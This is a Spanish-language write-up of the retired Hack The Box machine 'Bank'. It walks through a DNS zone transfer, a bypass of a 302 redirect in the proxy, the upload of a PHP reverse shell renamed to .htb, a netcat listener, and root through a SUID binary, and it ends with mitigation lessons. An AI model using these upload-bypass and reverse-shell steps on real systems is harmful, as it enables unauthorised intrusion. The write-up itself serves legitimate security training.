---
machine: Bank
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, dns, axfr, upload-bypass, suid]
---

# Bank — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

La zona DNS se transfiere y revela `bank.htb` y `chris.bank.htb`. En `bank.htb` hay un panel de login y un `support.php` que responde `302` a cualquiera: si se cambia el código a `200` en el proxy, aparece el formulario de subida. La whitelist solo permite `.htb`, pero Apache sirve esa extensión como PHP, así que el reverse shell entra renombrado. Dentro, un binario SUID propio del reto (`/var/htb/bin/emergency`) da root directo.

## Reconocimiento

```bash
nmap -sC -sV -p- <IP> -oN nmap.txt
```

```text
22/tcp  ssh   OpenSSH 6.6.1p1
53/tcp  dns   ISC BIND 9.9.5-3
80/tcp  http  Apache httpd 2.4.29
```

## Enumeración

```bash
dig axfr @<IP> bank.htb
```

```text
bank.htb.        604800 IN A <IP>
chris.bank.htb.  604800 IN A <IP>
admin.bank.htb.  604800 IN A <IP>
```

```bash
echo "<IP> bank.htb chris.bank.htb admin.bank.htb" | sudo tee -a /etc/hosts
gobuster dir -u http://bank.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

`chris.bank.htb` es la página por defecto de Apache. En `bank.htb` hay login, `index.php` y un `support.php` que devuelve `302` al login aunque la sesión no exista.

## Foothold

El `302` es cosmético: el HTML del formulario viaja igual en la respuesta. Interceptando en Burp y cambiando el código a `200 OK`, el formulario de tickets aparece y con él la subida de adjuntos.

```text
POST /support.php HTTP/1.1
...
Content-Disposition: form-data; name="file"; filename="php-reverse-shell.htb"
```

La comprobación es por extensión: acepta `.htb` y rechaza `.php`. Pero el `AddHandler` de Apache mapea `.htb` a PHP, así que basta renombrar el shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.htb
# editar IP/puerto dentro del fichero
curl -F "file=@shell.htb" http://bank.htb/support.php   # o por el formulario
curl http://bank.htb/uploads/shell.htb
```

```bash
nc -lvnp 4444
```

```text
www-data@bank:/var/www/bank$
```

## Escalada

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/var/htb/bin/emergency
```

Es un binario del propio reto, propiedad de root y con SUID. Al ejecutarlo abre una shell sin comprobar nada:

```bash
/var/htb/bin/emergency
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Evidencia (redactada)

```text
/home/chris/user.txt  -> <user_flag>
/root/root.txt        -> <root_flag>
```

## Lecciones

- Un `302` no protege un recurso: el cuerpo se envía igual y basta cambiar el código para verlo.
- Filtrar por extensión es inútil si el servidor mapea extensiones arbitrarias a un intérprete; hay que validar tipo real y servir las subidas desde fuera del árbol ejecutable.
- Un SUID "de la casa" es una puerta trasera permanente: se audita con `find -perm -4000` y se justifica cada binario.
- Mitigación: `support.php` con control de sesión real, whitelist de MIME y `php_admin_flag engine off` en el directorio de subidas.
